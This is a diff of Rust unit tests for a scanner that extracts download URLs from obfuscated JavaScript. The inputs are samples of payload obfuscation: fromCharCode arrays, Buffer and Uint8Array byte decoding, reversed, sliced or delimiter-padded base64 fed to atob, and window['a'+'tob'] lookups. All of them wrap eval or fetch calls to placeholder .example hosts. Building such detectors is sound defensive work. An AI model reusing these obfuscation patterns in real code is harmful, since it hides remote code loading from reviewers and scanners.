@@ -39376,6 +39376,96 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_fromcharcode_apply_array_variable_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let chars = "https://char-apply-var-js.example/p"
+            .bytes()
+            .map(|b| b.to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!("var a = [{chars}]; var u = String.fromCharCode.apply(null, a); eval(u)")
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://char-apply-var-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS fromCharCode.apply array variable URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_fromcharcode_apply_inline_array_constructor_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let chars = "https://char-apply-inline-ctor-js.example/p"
+            .bytes()
+            .map(|b| b.to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!("var u = String.fromCharCode.apply(null, Array({chars})); eval(u)")
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://char-apply-inline-ctor-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS fromCharCode.apply inline Array(...) URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_fromcharcode_call_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let chars = "https://char-call-js.example/p"
+            .bytes()
+            .map(|b| b.to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!("var u = String.fromCharCode.call(null, {chars}); eval(u)").into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://char-call-js.example/p"
+            )
+        });
+        assert!(has, "JS fromCharCode.call URL missed: {:?}", env.traits);
+    }
+
+    #[test]
+    fn js_fromcharcode_spread_inline_array_constructor_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let chars = "https://char-spread-inline-ctor-js.example/p"
+            .bytes()
+            .map(|b| b.to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!("var u = String.fromCharCode(...Array({chars})); eval(u)").into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://char-spread-inline-ctor-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS fromCharCode spread inline Array(...) URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_variable_member_fromcharcode_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let chars = "https://char-member-var-js.example/p"
@@ -39651,6 +39741,133 @@ mod js_url_extraction_tests {
         assert!(
             has,
             "JS Buffer.from.bind base64 payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_buffer_from_byte_array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://buffer-from-byte-array-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"eval(Buffer.from([{bytes}]).toString())"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://buffer-from-byte-array-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS Buffer.from byte array payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_buffer_from_uint8array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://buffer-from-uint8array-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"eval(Buffer.from(new Uint8Array([{bytes}])).toString())"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://buffer-from-uint8array-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS Buffer.from Uint8Array payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_buffer_from_uint8array_from_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://buffer-from-uint8array-from-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js =
+            format!(r#"eval(Buffer.from(Uint8Array.from([{bytes}])).toString())"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://buffer-from-uint8array-from-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS Buffer.from Uint8Array.from payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_buffer_from_uint8array_of_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://buffer-from-uint8array-of-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"eval(Buffer.from(Uint8Array.of({bytes})).toString())"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://buffer-from-uint8array-of-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS Buffer.from Uint8Array.of payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_textdecoder_uint8array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-uint8array-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js =
+            format!(r#"eval(new TextDecoder().decode(new Uint8Array([{bytes}])))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-uint8array-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder Uint8Array payload URL missed: {:?}",
             env.traits
         );
     }
@@ -40882,6 +41099,205 @@ mod js_url_extraction_tests {
             "JS atob payload with whitespace missed: {:?}",
             env.traits
         );
+    }
+
+    #[test]
+    fn js_atob_reversed_string_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-reversed-string-js.example/p')",
+        );
+        let reversed: String = encoded.chars().rev().collect();
+        let js = format!(r#"eval(atob("{reversed}".split("").reverse().join("")))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-reversed-string-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob reversed string payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_sliced_string_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-sliced-string-js.example/p')",
+        );
+        let js = format!(r#"var b = "xx{encoded}zz"; eval(atob(b.slice(2, -2)))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-sliced-string-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob sliced string payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_substr_string_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-substr-string-js.example/p')",
+        );
+        let len = encoded.len();
+        let js = format!(r#"var b = "xx{encoded}zz"; eval(atob(b.substr(2, {len})))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-substr-string-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob substr string payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_substring_string_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-substring-string-js.example/p')",
+        );
+        let end = encoded.len() + 2;
+        let js =
+            format!(r#"var b = "xx{encoded}zz"; eval(atob(b.substring(2, {end})))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-substring-string-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob substring string payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_split_join_delimited_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-split-join-delimited-js.example/p')",
+        );
+        let noisy = encoded.chars().flat_map(|ch| [ch, '~']).collect::<String>();
+        let js = format!(r#"var b = "{noisy}"; eval(atob(b.split("~").join("")))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-split-join-delimited-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob split join delimited payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_to_string_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-to-string-js.example/p')",
+        );
+        let js = format!(r#"var b = "{encoded}"; eval(atob(b.toString()))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-to-string-js.example/p"
+            )
+        });
+        assert!(has, "JS atob toString payload URL missed: {:?}", env.traits);
+    }
+
+    #[test]
+    fn js_variable_member_atob_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://member-atob-var-js.example/p')",
+        );
+        let js =
+            format!(r#"var f = "a" + "tob"; var b = "{encoded}"; var u = window[f](b); eval(u)"#)
+                .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://member-atob-var-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS variable member atob payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_direct_variable_member_atob_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://direct-member-atob-var-js.example/p')",
+        );
+        let js = format!(r#"var f = "a" + "tob"; eval(window[f]("{encoded}"))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://direct-member-atob-var-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS direct variable member atob payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_unpadded_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-unpadded-js.example/p')",
+        )
+        .trim_end_matches('=')
+        .to_string();
+        let js = format!(r#"eval(atob("{encoded}"))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-unpadded-js.example/p"
+            )
+        });
+        assert!(has, "JS unpadded atob URL missed: {:?}", env.traits);
     }
 
     #[test]
